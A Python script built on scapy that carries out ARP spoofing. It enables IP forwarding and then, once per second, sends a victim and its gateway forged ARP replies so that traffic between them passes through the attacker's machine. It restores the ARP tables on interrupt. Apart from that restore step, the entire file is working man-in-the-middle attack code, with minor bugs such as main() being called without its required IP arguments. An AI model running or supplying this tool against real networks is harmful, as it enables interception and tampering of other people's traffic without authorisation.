from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()

def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    
def spoof(victim_ip, gateway_ip, verbose=True):
    """
    Spoofs `victim_ip` saying that we are `gateway_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(victim_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=victim_ip, hwdst=target_mac, psrc=gateway_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(victim_ip, gateway_ip, self_mac))

def restore(victim_ip, gateway_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `victim_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(victim_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(gateway_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=victim_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(victim_ip, gateway_ip, host_mac))

def main(victim_ip, gateway_ip):
    verbose = True
    enable_ip_route() # Enable ip forwarding (ip tables)
    try:
        while True:
            # telling the `victim` that we are the `ip to spoof`
            spoof(victim_ip, gateway_ip, verbose)
            spoof(gateway_ip, victim_ip, verbose)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(victim_ip, gateway_ip)
        restore(gateway_ip, victim_ip)

if __name__ == "__main__":
    main()